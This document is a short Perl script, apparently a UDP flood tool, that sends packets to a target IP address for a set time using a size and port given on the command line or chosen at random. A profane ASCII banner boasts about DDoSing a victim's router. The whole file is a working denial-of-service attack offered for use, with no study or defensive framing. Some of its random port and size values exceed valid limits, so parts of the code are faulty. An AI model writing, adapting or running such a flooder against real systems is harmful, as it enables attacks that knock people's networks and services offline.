#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# ViralUnperified <---
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD BLUE<<EOTEXT;
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++♦
Fuck Math,I Like Ddosing My Problems                          +
                                                              +
░████          ░████      ░████     ░████████ ░██         ░██ +
░██░██        ░██░██     ░██ ░██       ░██    ░██         ░██ +
░██ ░██      ░██ ░██    ░██   ░██      ░██    ░██         ░██ +
░██  ░██    ░██  ░██   ░██     ░██     ░██    ░██         ░██ +
░██   ░██  ░██   ░██  ░██       ░██    ░██    ░██         ░██ +
░██    ░██░██    ░██ ░██         ░██   ░██    ░██████████████ +
░██     ░███     ░██ ░██         ░██   ░██    ░██         ░██ +
░██              ░██ ░██████████████   ░██    ░██         ░██ +
░██              ░██ ░██         ░██   ░██    ░██         ░██ +
░██              ░██ ░██         ░██   ░██    ░██         ░██ +
                                                              +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++♦
Fucking My Problems Up.
By:ViralUnperified Aka Scarcly

EOTEXT

print "Fucking My Problems Up : $ip " . ($port ? $port : "random") . "
Getting Fucked with " .
  ($size ? "$size byte's" : "Error..") . "
  ~My Math Problem Fucked Your Router! 
  ~Your My Problem Now Get Ddos! ~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}  